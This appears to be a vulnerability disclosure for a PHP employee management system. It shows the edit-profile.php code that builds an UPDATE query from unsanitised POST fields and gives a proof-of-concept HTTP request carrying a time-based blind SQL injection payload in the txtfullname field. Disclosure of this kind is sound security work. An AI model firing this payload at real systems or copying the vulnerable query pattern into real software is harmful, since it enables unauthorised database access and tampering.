### Vulnerability file address

`Employee/edit-profile.php` from line 8,The `$_POST['txtfullname']` parameter is controllable and the `$_POST['txtfullname']` is not protected from sql injection, line 8`$sql = " update tblemployee set fullname='".$_POST['txtfullname']."',sex='".$_POST['cmdsex']."',dob='".$_POST['txtdob']."',phone='".$_POST['txtphone']."',address='".$_POST['txtaddress']."',qualification='".$_POST['txtqualification']."',dept='".$_POST['cmddept']."',employee_type='".$_POST['cmdemployeetype']."',date_appointment='".$_POST['txtappointment']."',basic_salary='".$_POST['txtbasic_salary']."',gross_pay='".$_POST['txtgross_pay']."' where email='$email'";` ,line 9`mysqli_query($conn, $sql)`Line 15 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php');
if (empty($_SESSION['login_email'])) {
    header("Location: ../Account/login.php");
}

if (isset($_POST["btnedit"])) {
    $sql = " update tblemployee set fullname='".$_POST['txtfullname']."',sex='".$_POST['cmdsex']."',dob='".$_POST['txtdob']."',phone='".$_POST['txtphone']."',address='".$_POST['txtaddress']."',qualification='".$_POST['txtqualification']."',dept='".$_POST['cmddept']."',employee_type='".$_POST['cmdemployeetype']."',date_appointment='".$_POST['txtappointment']."',basic_salary='".$_POST['txtbasic_salary']."',gross_pay='".$_POST['txtgross_pay']."' where email='$email'";
    if (mysqli_query($conn, $sql)) {
        header("Location: profile.php");
    } else {
        $_SESSION['error'] = 'Editing Was Not Successful';
    }
}
```

### POC

```http
POST /CMS/php/employee_akpoly/Employee/edit-profile.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 243
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Employee/edit-profile.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

txtfullname='||(SELECT 0x55464841 WHERE 5975=5975 AND (SELECT 1479 FROM (SELECT(SLEEP(5)))kHxj))||'&cmdsex=Male&txtphone=08067361023&txtdob=12/9/1980&txtaddress=12 Ikono rd&txtqualification=Msc&cmddept=Bursary&cmdemployeetype=Academic&txtappointment=9/9/2023&txtbasic_salary=21000&txtgross_pay=25000&btnedit=
```

### Attack results pictures

![image-20250128194648951](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281946007.png)
